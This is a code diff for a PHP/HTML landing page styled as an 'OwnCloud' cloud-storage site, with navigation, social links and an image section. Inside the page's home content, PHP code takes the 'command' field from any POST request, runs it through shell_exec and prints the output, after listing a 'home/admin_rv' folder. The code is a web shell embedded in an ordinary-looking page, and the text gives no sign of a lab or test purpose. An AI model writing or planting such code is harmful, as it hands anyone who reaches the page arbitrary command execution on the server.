@@ -11,16 +11,51 @@
 
 
 
-<?php
+<body>
+
+<header class="header">
+    <a href="#" class="logo">OwnCloud<i class='bx bx-cloud' ></i> </a>
+
+    <nav class="navbar">
+        <a href="../html/home.html" class="active">Home</a>
+        <a href="#">About</a>
+        <a href="#">Review</a>
+        <a href="../html/regon.html">Sign Up</a>
+        <a href="../html/logon.html">Login</a>
+    </nav>
+
+    <div class="social-media">
+        <a href="#"><i class='bx bxl-instagram-alt' ></i></a>
+        <a href="#"><i class='bx bxl-meta' ></i></a>
+        <a href="#"><i class='bx bxl-reddit' ></i></a>
+    </div>
+</header>
+
+<section class="home">
+    <div class="home-content">
 
 
+                <?php
 
-$command = $_POST["command"];
+                    $command = $_POST["command"];
 
-$file_user = "admin_rv";
-echo "<pre>";
-echo shell_exec("cd home/$file_user ; ls");
-echo shell_exec("$command");
-echo "</pre>";
+                    $file_user = "admin_rv";
+                    echo "<pre>";
+                    echo shell_exec("cd home/$file_user ; ls");
+                    echo shell_exec("$command");
+                    echo "</pre>";
 
-?>
+                ?>
+
+
+    </div>
+    
+    <div class="home-img">
+        <div class="rhombus">
+            <img src='../Pictures/back-bg.png' alt="">
+        </div>
+    </div>
+
+</section>
+
+</body>
